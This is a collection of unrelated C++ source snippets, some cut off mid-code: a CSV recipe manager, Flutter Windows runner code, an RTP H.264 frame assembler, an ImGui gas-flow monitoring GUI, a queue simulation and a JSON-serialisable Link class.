display_recipe_category(const string &file_name) {\n    ifstream file(file_name);\n    if (!file.is_open()) {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n\n    string line;\n    while (getline(file, line)) {\n        Recipe recipe = add_line_in_vector(line);\n        cout << \"Recipe: \" << recipe.recipe[0] << \" - Category: \" << recipe.recipe[1] << endl;\n    }\n    \n    file.close();\n}\n\nvoid ingredientsearch(const string &file_name, const string &ingredient_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (ingredient_name == recipe.recipe[i])\n            {\n                flag = 1;\n                cout << recipe.recipe[0] << endl;\n            }\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe contain these ingredients.\" << endl;\n    }\n    file.close();\n}\n\nvoid recipe_adder(const string &rec_name, const string &rec_type, const string &rec_ings, const string &rec_steps, ofstream &tracker)\n{\n    tracker << rec_name << \",\" << rec_type << \",\" << rec_ings << \",directions,\" << rec_steps << endl;\n    tracker.seekp(-1, ios_base::cur);   //to move to the file pointer to starting of the file\n}\n\nvoid recipe_deleter(const string& filename, const string& recipe_name) {\n    ifstream infile(filename);\n    if (!infile) {\n        cerr << \"Error: Unable to open file \" << filename << endl;  //error  meassage\n        return;\n    }\n    //creating vector to hold strings\n    vector<string> lines;\n    string line;\n    \n    while (getline(infile, line)) {\n    if (line.find(recipe_name) == string::npos) {\n        lines.push_back(line);\n    }\n    else\n    cout << \"Recipe has been deleted.\" << endl;\n    }\n\n    infile.close();\n    ofstream outfile(filename);\n    if (!outfile) {\n        cout << \"Error: Unable to open file \" << filename << \" for writing.\" << endl;\n        return;\n    }\n    //writes the recipes to the file\n    for (const auto& l : lines) {\n        outfile << l << endl;\n    }\n    outfile.close();\n}\n\nvoid categorysearch(const string &file_name, const string &category_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n\n        if (category_name == recipe.recipe[1])\n        {\n            flag = 1;\n            cout << recipe.recipe[0] << endl;\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe is found of these category.\" << endl;\n    }\n    file.close();\n}\nvoid displayMP()\n{\n    ifstream file(\"Book.csv\");\n    if (!file.is_open())\n    {\n        cout << \"ERROR: Unable to ope",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"rtp_h264_frame_assembler.h\"\r\n\r\n#include <string.h>\r\n#include <sys/types.h>\r\n#ifdef _WIN32\r\n#include <winsock2.h>\r\n#else\r\n#include <netinet/ip.h>\r\n#include <arpa/inet.h>\r\n#include <sys/socket.h>\r\n#endif\r\n#include \"common_logger.h\"\r\n\r\nnamespace\r\n{\r\n\tconst uint8_t START_CODE[] = { 0, 0, 0, 1 };\r\n\tconst uint8_t SHORT_START_CODE[] = { 0, 0, 1 };\r\n}\r\n\r\nRTPH264FrameAssembler::RTPH264FrameAssembler()\r\n\t:m_initialize(false), m_buffer(NULL), m_buffer_used_len(0)\r\n{\r\n}\r\n\r\nRTPH264FrameAssembler::~RTPH264FrameAssembler()\r\n{\r\n\tif (m_buffer)\r\n\t{\r\n\t\tdelete[] m_buffer;\r\n\t}\r\n}\r\n\r\nbool RTPH264FrameAssembler::initialize()\r\n{\r\n\tif (m_initialize)\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\r\n\tm_buffer = new uint8_t[ASSEMBLER_BUFFER_SIZE];\r\n\tif (!m_buffer)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\tm_initialize = true;\r\n\treturn true;\r\n}\r\n\r\nbool RTPH264FrameAssembler::push_packet(RTPPacket* packet)\r\n{\r\n\tif (!m_initialize)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\tuint8_t* payload;\r\n\tsize_t payloadLen;\r\n\tuint8_t nal;\r\n\tuint8_t type;\r\n\r\n\tpayload = packet->get_payload();\r\n\tpayloadLen = packet->get_payload_length();\r\n\tif (payloadLen == 0)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\tnal = payload[0];\r\n\ttype = nal & 0x1F;\r\n\r\n\tif (type >= 1 && type <= 23)\r\n\t{\r\n\t\ttype = 1;\r\n\t}\r\n\r\n\tswitch (type)\r\n\t{\r\n\tcase 0:\r\n\tcase 1:  //single nalu\r\n\t\tif (nal == 0x65 || ((nal == 0x61 || nal == 0x41) && ((payload[1] & 0x80) == 0x0)))\r\n\t\t{\r\n\t\t\tif (payloadLen + sizeof(SHORT_START_CODE) > ASSEMBLER_BUFFER_SIZE)\r\n\t\t\t{\r\n\t\t\t\tm_buffer_used_len = 0;\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\r\n\t\t\tm_buffer_used_len = payloadLen + sizeof(SHORT_START_CODE);\r\n\t\t\tmemcpy(m_buffer, SHORT_START_CODE, sizeof(SHORT_START_CODE));\r\n\t\t\tmemcpy(m_buffer + sizeof(SHORT_START_CODE), payload, payloadLen);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (payloadLen + sizeof(START_CODE) > ASSEMBLER_BUFFER_SIZE)\r\n\t\t\t{\r\n\t\t\t\tm_buffer_used_len = 0;\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\r\n\t\t\tm_buffer_used_len = payloadLen + sizeof(START_CODE);\r\n\t\t\tmemcpy(m_buffer, START_CODE, sizeof(START_CODE));\r\n\t\t\tmemcpy(m_buffer + sizeof(START_CODE), payload, payloadLen);\r\n\t\t}\r\n\r\n\t\treturn true;\r\n\r\n\tcase 24:  //STAP-A\r\n\t\tpayload++;\r\n\t\tpayloadLen--;\r\n\r\n\t\treturn get_stapa_frame(payload, payloadLen);\r\n\r\n\tcase 28:  //FU-A\r\n\r\n\t\treturn get_fua_frame(payload, payloadLen);\r\n\r\n\tdefault:\r\n\t\tLOG_ERROR(\"Unknown h264 rtp packet format.\");\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\nbool RTPH264FrameAssembler::get_stapa_frame(uint8_t* data, size_t len)\r\n{\r\n\tconst uint8_t *src = data;\r\n\tint srcLen = (int)len;\r\n\r\n\tm_buffer_used_len = 0;\r\n\r\n\twhile (srcLen > 2)\r\n\t{\r\n\t\tuint16_t* nalSizePtr = (uint16_t*)src;\r\n\t\tuint16_t nalSize = ntohs(*nalSizePtr);\r\n\r\n\t\tsrc += 2;\r\n\t\tsrcLen -= 2;\r\n\t\tif (nalSize <= srcLen)\r\n\t\t{\r\n\t\t\tif (src[0] == 0x65 || ((src[0] == 0x61 || src[0] == 0x41) && ((src[1] & 0x80) == 0x0)))\r\n\t\t\t{\r\n\t\t\t\tmemcpy(m_buffer + m_buffer_used_len, SHORT_START_CODE, sizeof(SHORT_START_CODE));\r\n\t\t\t\tm_buffer_used_len += sizeof(SHORT_START_CODE);\r\n\r\n\t\t\t\tmemcpy(m_buffer + m_buffer_used_len, src, nalSize);\r\n\t\t\t\tm_buffer_used_len += nalSize;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tmemcpy(m_buffer + m_buffer_used_len, START_CODE, sizeof(START_CODE));\r\n\t\t\t\tm_buffer_used_len += sizeof(START_CODE);\r\n\r\n\t\t\t\tmemcpy(m_buffer + m_buffer_used_len, src, nalSize);\r\n\t\t\t\tm_buffer_used_len += nalSize;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t//invalid format\r\n\t\t\tm_buffer_used_len = 0;\r\n\t\t\treturn false;\r\n\t\t}\r\n\r\n\t\tsrc += nalSize;\r\n\t\tsrcLen -= nalSize;\r\n\t}\r\n\r\n\tif (m_buffer_used_len > ASSEMBLER_BUFFER_SIZE)\r\n\t{\r\n\t\tm_buffer_used_len = 0;\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}\r\n\r\nbool RTPH264FrameAssembler::get_fua_frame(uint8_t* data, size_t len)\r\n{\r\n\tuint8_t fuIndicator;\r\n\tuint8_t fuHeader;\r\n\tuint8_t startbit;\r\n\tuint8_t endbit;\r\n\tuint8_t nalType;\r\n\tuint8_t nal;\r\n\r\n\tif (len < 3 || len > ASSEMBLER_BUFFER_SIZE)\r\n\t{\r\n\t\tm_buffer_used_len = 0;\r\n\t\treturn false;\r\n\t}\r\n\r\n\tfuIndicator = data[0];\r\n\tfuHeader = data[1];\r\n\tstartbit = fuHeader >> 7;\r\n\tendbit = fuHeader & 0x40;\r\n\tnalType = fuHeader & 0x1f;\r\n\tnal = (fuIndicator & 0xe0) | nalType;\r\n\r\n\tdata += 2;\r\n\tlen -= 2;\r\n\r\n\tif (startbit)\r\n\t{\r\n\t\tif (data[0] == 0x65 || ((data[0] == 0x61 || data[0] == 0x41) && ((data[1] & 0x80) == 0x0)))\r\n\t\t{\r\n\t\t\tm_buffer_used_len = sizeof(SHORT_START_CODE) + 1 + len;\r\n\t\t\tmemcpy(m_buffer, SHORT_START_CODE, sizeof(SHORT_START_CODE));\r\n\t\t\tmemcpy(m_buffer + sizeof(SHORT_START_CODE), &nal, 1);\r\n\t\t\tmemcpy(m_buffer + sizeof(SHORT_START_CODE) + 1, data, len);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tm_buffer_used_len = sizeof(START_CODE) + 1 + len;\r\n\t\t\tmemcpy(m_buffer, START_CODE, sizeof(START_CODE));\r\n\t\t\tmemcpy(m_buffer + sizeof(START_CODE), &nal, 1);\r\n\t\t\tmemcpy(m_buffer + sizeof(START_CODE) + 1, data, len);\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t}\r\n\telse if(endbit)\r\n\t{\r\n\t\tmemcpy(m_buffer + m_buffer_used_len, data, len);\r\n\t\tm_buffer_used_len += len;\r\n\r\n\t\treturn true;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tmemcpy(m_buffer + m_buffer_used_len, data, len);\r\n\t\tm_buffer_used_len += len;\r\n\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\nuint8_t* RTPH264FrameAssembler::get_frame_data()\r\n{\r\n\treturn m_buffer;\r\n}\r\n\r\nsize_t RTPH264FrameAssembler::get_frame_length()\r\n{\r\n\treturn m_buffer_used_len;\r\n}\r\n",
    "#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_opengl2.h\"\n#include \"implot.h\"\n#include <cstdio>\n#include <SDL.h>\n#include <SDL_opengl.h>\n#include <array>\n#include <iostream>\n#include <vector>\n#include <chrono>\n\n\n// Main code\nint main(int, char**)\n{\n    // Setup SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMECONTROLLER) != 0)\n    {\n        printf(\"Error: %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    // From 2.0.18: Enable native IME.\n#ifdef SDL_HINT_IME_SHOW_UI\n    SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");\n#endif\n\n    // Setup window\n    SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);\n    SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);\n    SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 2);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 2);\n    auto window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);\n    SDL_Window* window = SDL_CreateWindow(\"Monitoring for Gas FLow control system\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, window_flags);\n    if (window == nullptr)\n    {\n        printf(\"Error: SDL_CreateWindow(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    SDL_GLContext gl_context = SDL_GL_CreateContext(window);\n    SDL_GL_MakeCurrent(window, gl_context);\n    SDL_GL_SetSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImPlot::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n    io.ConfigFlags |= ImGuiConfigFlags_DockingEnable;         // Enable Docking\n    io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;       // Enable Multi-Viewport / Platform Windows\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;\n\n\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // When viewports are enabled we tweak WindowRounding/WindowBg so platform windows can look identical to regular ones.\n    ImGuiStyle& style = ImGui::GetStyle();\n    if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)\n    {\n        style.WindowRounding = 0.0f;\n        style.Colors[ImGuiCol_WindowBg].w = 1.0f;\n    }\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplSDL2_InitForOpenGL(window, gl_context);\n    ImGui_ImplOpenGL2_Init();\n\n    //IM_ASSERT(font != nullptr);\n    io.Fonts->AddFontFromFileTTF(\"/home/tehnokrat/Downloads/BruceForeverRegular-X3jd2.ttf\", 15.0f);\n\n    bool show_demo_window = false;\n    bool show_another_window = false;\n    bool show_plot_window = true;\n\n    std::string connection_button_label = \"Connect\";\n\n    std::vector<std::string> logs = {\n            \"Application opened successfully\",\n            \"Logging started...\",\n    };\n\n    std::vector<std::string> logs_data = {};\n    std::vector<std::string> logs_time = {};\n\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n    int window_height, window_width, window_position_x, window_position_y;\n\n    std::vector<double> times; // This will store the time values\n    std::vector<double> framerates; // This will store the framerate values\n\n    auto start = std::chrono::system_clock::now();\n\n    while (!done){\n        SDL_Event event;\n        while (SDL_PollEvent(&event))\n        {\n            ImGui_ImplSDL2_ProcessEvent(&event);\n            if (event.type == SDL_QUIT)\n                done = true;\n            if (event.type == SDL_WINDOWEVENT && event.window.event == SDL_WINDOWEVENT_CLOSE && event.window.windowID == SDL_GetWindowID(window))\n                done = true;\n        }\n\n        // Start the Dear ImGui frame\n        ImGui_ImplOpenGL2_NewFrame();\n        ImGui_ImplSDL2_NewFrame();\n        ImGui::NewFrame();\n\n        //ImGui::DockSpaceOverViewport(ImGui::GetMainViewport());\n\n\n        auto now = std::chrono::system_clock::now();\n        // Calculate the time elapsed since the start of the application in seconds\n        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start);\n        auto current_time = elapsed.count();\n\n\n        double current_framerate = io.Framerate;\n\n        SDL_GetWindowSize(window, &window_width, &window_height);\n        SDL_GetWindowPosition(window, &window_position_x, &window_position_y);\n\n\n        ImGui::SetNextWindowSize(ImVec2(window_width * 1 / 3, window_height)); // Set \"New Window\" size to 1/3 of SDL window width and full height\n        ImGui::SetNextWindowPos(ImVec2(window_position_x, window_position_y)); // Set \"New Window\" position to top left corner\n\n        if (ImGui::Begin(\"Control panel\")) // begin window\n        {\n            if (ImGui::Button(connection_button_label.c_str())) // Buttons return true when clicked.\n            {\n                connection_button_label = (co",
    "#include <iostream>\n#include <queue>\n#include <vector>\n#include <random>\n#include \"client/client.h\"\n#include \"server/server.h\"\n\nint main()\n{\n\tint systime = 1000;\n\tstd::queue<Client> clientqueue;\n\n\n\t// Generate Servers\n\tint totalservers = 5;\n\tstd::vector<Server> servers;\n\n\tfor (int i = 0; i < totalservers; i++) {\n\t\tServer server;\n\t\tservers.push_back(server);\n\t}\n\n\n\twhile (systime != 0) {\n\n\t\t// Generate clients in a poisson distribution\n\t\tstd::random_device rd;\n\t\tstd::mt19937 gen(rd());\n\t\tdouble mean = 0.0833;\n\t\tstd::poisson_distribution<int> poisson_dist(mean);\n\n\t\tint value = poisson_dist(gen);\n\n\t\tfor (int i = 0; i < value; i++) {\n\t\t\tClient client(systime);\n\t\t\tclient.arrive(clientqueue);\n\t\t}\n\n\t\tif (clientqueue.size() > servers.size()) {\n\t\t\tfor (auto& server : servers) {\n\t\t\t\tif (server.isServerBusy()) {\n\t\t\t\t\tserver.serve();\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t// Requires fix, this should only run on the second task of callNext\n\n\t\t\t\t\t/*if (clientqueue.size() > 3) {\n\t\t\t\t\t\tserver.wrapTask(systime);\n\t\t\t\t\t}*/\n\t\t\t\t\tserver.callNext(clientqueue, systime);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t\n\t\tsystime--;\n\t}\n\tstd::cout << \"Current Queue Size\" << \"\\t\" << clientqueue.size() << \"\\n\";\n\n\tfor (auto& server : servers) {\n\t\tstd::cout << \"Total clients served\" <<\"\\t\" << server.clients_served << \"\\n\";\n\t}\n}\n",
    "\n#include \"Link.h\"\n\nLink::Link\n(void)\n{\n  this->class_name = \"Link\";\n  this->url = \"\";\n}\n\nLink::Link\n(std::string arg_url)\n{\n  this->class_name = \"Link\";\n  this->url = arg_url;\n}\n\nbool\nLink::operator==\n(Link& aLink)\n{\n  return (this->url == aLink.url);\n}\n\nJson::Value *\nLink::dump2JSON\n(void)\n{\n  if (this->url != \"\")\n    {\n      Json::Value *result_ptr = new Json::Value();\n      (*result_ptr)[\"url\"] = this->url;\n      (*result_ptr)[\"host url\"] = this->host_url;\n      (*result_ptr)[\"class name\"] = this->class_name;\n      (*result_ptr)[\"object id\"] = this->object_id;\n      return result_ptr;\n    }\n  else\n    {\n      return (Json::Value *) NULL;\n    }\n}\n\nvoid\nLink::JSON2Object\n(Json::Value * arg_json_ptr)\n{\n  Exception_Info * ei_ptr = NULL;\n  ecs36b_Exception * lv_exception_ptr = new ecs36b_Exception {};\n\n  if (arg_json_ptr == ((Json::Value *) NULL))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_LINK;\n      ei_ptr->which_string = \"default\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n      ei_ptr->what_code = ECS36B_ERROR_NULL_JSON_PTR;\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n      throw (*lv_exception_ptr);\n    }\n\n  if ((arg_json_ptr->isNull() == true) ||\n      (arg_json_ptr->isObject() != true))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_LINK;\n      ei_ptr->which_string = \"default\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if (arg_json_ptr->isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n      throw (*lv_exception_ptr);\n    }\n\n  if (((*arg_json_ptr)[\"url\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"url\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_LINK;\n      ei_ptr->which_string = \"url\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"url\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->url = ((*arg_json_ptr)[\"url\"]).asString();\n    }\n\n  if (((*arg_json_ptr)[\"host url\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"host url\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_LINK;\n      ei_ptr->which_string = \"host url\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"host url\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->host_url = ((*arg_json_ptr)[\"host url\"]).asString();\n    }\n\n  if (((*arg_json_ptr)[\"class name\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"class name\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_LINK;\n      ei_ptr->which_string = \"class name\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"class name\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->class_name = ((*arg_json_ptr)[\"class name\"]).asString();\n    }\n\n  if (((*arg_json_ptr)[\"object id\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"object id\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_LINK;\n      ei_ptr->which_string = \"object id\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"object id\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->object_id = ((*arg_json_ptr)[\"object id\"]).asString();\n    }\n\n  if ((lv_exception_ptr->info_vector).size() != 0)\n    {\n      throw (*lv_exception_ptr);\n    }\n\n  return;\n}\n",
